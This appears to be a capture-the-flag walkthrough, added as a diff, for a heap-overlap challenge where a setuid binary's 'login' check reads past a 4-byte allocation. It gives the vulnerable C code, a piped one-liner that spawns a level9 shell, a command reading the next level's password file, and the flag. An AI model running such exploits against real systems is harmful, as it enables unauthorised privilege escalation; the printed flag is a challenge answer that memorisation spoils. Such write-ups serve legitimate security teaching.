@@ -1,0 +1,57 @@
+# Level8 Walkthrough
+
+Binary is setuid `level9`. It is a small command loop: `auth`, `reset`, `service`,
+`login`.
+
+```c
+char *auth = NULL;
+char *service = NULL;
+
+int main(void) {
+  char line[128];
+
+  while (1) {
+    printf("%p, %p \n", auth, service);
+    fgets(line, 128, stdin);
+
+    if (strncmp(line, "auth ", 5) == 0) {
+      auth = malloc(4);
+      if (strlen(line + 5) <= 30)
+        strcpy(auth, line + 5);
+    }
+    if (strncmp(line, "service", 6) == 0)
+      service = strdup(line + 7);
+    if (strncmp(line, "login", 5) == 0) {
+      if (auth[32] != 0)
+        system("/bin/sh");
+    }
+  }
+}
+```
+
+## Vulnerability
+
+`auth` is allocated with `malloc(4)` (4 bytes), but `login` checks `auth[32]`, well
+past the end of the block. That byte belongs to whatever was allocated next on the
+heap. `service = strdup(line + 7)` allocates right after `auth`, so the text passed
+to `service` lands at `auth + 16` and covers `auth[32]`. Any non-zero byte there
+passes the check and opens a shell as `level9`.
+
+## Exploitation
+
+- `auth ` allocates the 4-byte block.
+- `service ` + a long string fills the heap right after it, so `auth[32]` is non-zero.
+- `login` then runs `system("/bin/sh")`.
+
+```sh
+(echo "auth "; echo "service AAAAAAAAAAAAAAAAAAAA"; echo "login"; cat) | ./level8
+```
+
+The `%p, %p` line confirms the layout: `auth = 0x804a008`, `service = 0x804a018`
+(16 bytes after auth). In the shell, `cat /home/user/level9/.pass`.
+
+Flag:
+
+```txt
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+```
